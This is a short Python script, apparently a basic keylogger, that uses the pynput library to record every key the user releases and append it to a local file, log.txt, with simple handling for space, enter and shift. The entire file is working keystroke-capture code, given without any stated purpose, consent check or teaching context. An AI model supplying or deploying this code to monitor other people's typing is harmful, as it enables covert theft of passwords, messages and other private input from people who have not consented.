from pynput.keyboard import Key, Listener 

def log(text):
	with open("log.txt","a") as file_log:
		file_log.write(text)

def press(key):
    key = str(key).replace("'", "")
    
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
    if key == "Key.shift":
        key = ''

    log(key)
		


with Listener(on_release=press) as listener:
	listener.join()